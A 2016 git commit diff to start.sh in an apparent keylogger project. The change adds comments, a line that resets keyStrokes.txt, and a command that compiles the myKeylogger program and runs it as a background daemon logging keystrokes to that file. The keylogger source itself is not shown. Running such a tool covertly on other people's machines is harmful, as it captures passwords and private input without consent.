cd1b1879c535bcf736c5f01b3f123f57ab869a75
pranavns <pranavns415@gmail.com>
2016-02-12 01:41:50 +0530

    Added comments

--- Keylogger/start.sh
+++ Keylogger/start.sh
@@ -1,9 +1,10 @@
 #!/bin/sh
 
-#Scipt to make the program and run it as a daemon 
-#stores the result in ouput_file.txt 
+#Scipt to compile the C file and run it as a daemon process. 
+#The C program has command line argument "keyStrokes.txt" for storing the output. 
 
+[[ -f keyStrokes.txt ]] && :>keyStrokes.txt || touch keyStrokes.txt
 make     myKeylogger
 chmod +x myKeylogger
 
-(./myKeylogger output_file.txt ) & exit ;
+(./myKeylogger keyStrokes.txt ) & exit;
